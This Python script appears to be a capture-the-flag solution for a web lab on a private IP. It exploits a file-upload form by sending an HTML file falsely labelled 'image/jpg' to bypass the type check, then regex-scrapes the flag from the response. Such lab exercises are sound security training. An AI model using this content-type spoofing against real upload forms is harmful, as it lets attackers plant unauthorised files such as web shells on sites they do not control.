#! /usr/bin/env python3
import requests
import re
import os

files = {
    'MAX_FILE_SIZE': (None, '100000'),
    'uploaded': ('index.html', open(os.path.dirname(os.path.abspath(__file__))+'/index.html','rb'), 'image/jpg'),
    'Upload': (None, 'Upload')
}
# data= {
#     "Content-Disposition": "form-data",
#     "Content-Type": "image/png",
#     "filename": "index.html"
# }

# Print the request to compare
# Need to be like to original :

#   -----------------------------40285433039014355152964518265
#   Content-Disposition: form-data; name="MAX_FILE_SIZE"
#
#   100000
#   -----------------------------40285433039014355152964518265
#   Content-Disposition: form-data; name="uploaded"; filename=""
#   Content-Type: application/octet-stream
#
#
#   -----------------------------40285433039014355152964518265
#   Content-Disposition: form-data; name="Upload"
#
#   Upload
#   -----------------------------40285433039014355152964518265--

req = requests.Request('POST', 'http://192.168.1.48/index.php?page=upload#', files=files)
print("The request:\n")
print(req.prepare().body.decode('ascii'))
print('-'*50)
ret = requests.post("http://192.168.1.48/index.php?page=upload#", files=files)

flag = ''
for line in ret.text.split():
    rx = re.compile(r'(([a-z]|[0-9])+)</h2><br/><img')
    match = rx.match(line)
    if match:
        flag = match.group(1)
print("The flag is:\n%s" % flag)
